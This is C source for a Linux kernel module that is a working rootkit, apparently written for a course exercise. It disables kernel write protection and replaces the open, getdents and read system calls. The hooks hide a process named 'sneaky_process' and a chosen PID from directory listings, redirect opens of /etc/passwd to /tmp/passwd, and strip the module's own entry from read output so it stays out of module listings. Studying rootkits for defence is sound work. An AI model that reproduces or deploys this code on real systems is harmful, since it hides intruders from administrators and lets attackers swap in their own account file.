#include <linux/module.h>      // for all modules
#include <linux/init.h>        // for entry/exit macros
#include <linux/kernel.h>      // for printk and other kernel bits
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
//#include <unistd.h>
//#include <stdio.h>
//#include <string.h>
//#include <stdlib.h>


#define BUF_SIZE 1024
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Shulin Xiang");
struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUF_SIZE];
};

static int pid = 0;
module_param(pid, int ,0);
MODULE_PARM_DESC(pid,"PID");


//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81073190;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81073110;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
//asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int (*original_open)(const char *pathname, int flags);
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);

//sneaky_getdents
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
  int nread;
  int bpos;
  char pid_str[10];
  int n;
  struct linux_dirent *ptr = dirp;
  struct linux_dirent* d;
  n = sprintf(pid_str,"%d",pid);
  nread = original_getdents(fd,ptr,count);
  if(nread>0){
    for (bpos = 0; bpos < nread;) {
      d = (void*)dirp + bpos;    
      if(strcmp(d->d_name,"sneaky_process") == 0 || strcmp(d->d_name,pid_str) == 0){
	int dirent_size = d->d_reclen;
	int size = ((void*)dirp + nread) - ((void*)d + dirent_size);
	void *after = ((void *)d + dirent_size);
	int to_delete = ((void*)dirp + nread) - ((void*)d);
	char temp[size];
	memcpy((void*)temp,after,size);
	memset(d,'\0',to_delete);
	memcpy(d,(void*)temp,size);
	//memcpy(d,after,size);
	//memmove(d, after, size);
	nread = nread - dirent_size; 
      }
      else{
	bpos += d->d_reclen;
      } 
    }
  }
  return nread;
}
//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  //printk(KERN_INFO "Very, very Sneaky!\n");
  if(strcmp(pathname, "/etc/passwd")== 0){
    //strlen + 1 ?
    copy_to_user((void __user *)pathname,"/tmp/passwd",strlen("/tmp/passwd")+1);
  }
  
  return original_open(pathname, flags);
}

//sneaky_read
asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
  ssize_t sz;
  void* ptr = buf;
  sz = original_read(fd,ptr,count);
  if(sz>0){
    char* read_pos = strstr((char*)buf,"sneaky_mod ");
    if(read_pos != NULL){   
      char* term_pos = strstr((char*)read_pos, "\n");
      if(term_pos != NULL){
	int length = (void*)term_pos -(void*)read_pos + 1;
	int after = ((void*)buf + sz) - ((void*)term_pos +1);
	int to_delete = ((void*)buf + sz) - ((void*)read_pos);
	char temp[after];
	memcpy((void*)temp,((void*)term_pos+1),after);
	memset((void*)read_pos,'\0',to_delete);
	memcpy((void*)read_pos,(void*)temp,after);
	//memcpy(read_pos,term_pos+1,after);
	//int size = ((void*)buf + sz) - ((void*)term_pos + 1);
	//memmove(read_pos, term_pos + 1, size);
	sz -= length;
      }
    }
  }
  return sz;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  original_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load
}


static void exit_sneaky_module(void)
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_open;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}


module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading

